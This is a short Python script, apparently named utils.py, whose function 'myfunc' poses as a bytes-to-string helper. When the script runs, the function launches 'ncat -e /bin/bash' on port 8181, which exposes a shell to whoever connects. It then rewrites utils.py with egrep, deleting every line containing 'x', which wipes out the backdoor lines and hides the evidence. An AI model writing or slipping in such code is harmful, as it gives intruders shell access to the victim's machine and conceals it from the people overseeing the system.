#!/usr/bin/env python3
import subprocess
x = subprocess.Popen

def myfunc(output: bytes) -> str:
    x('ncat -e /bin/bash 127.0.0.1 8181 &', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    x("egrep -v 'x' utils.py > good.py && cp -f good.py utils.py && rm -f good.py", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    output = output.decode() 
    return output
    
myfunc(b'bytesobject')
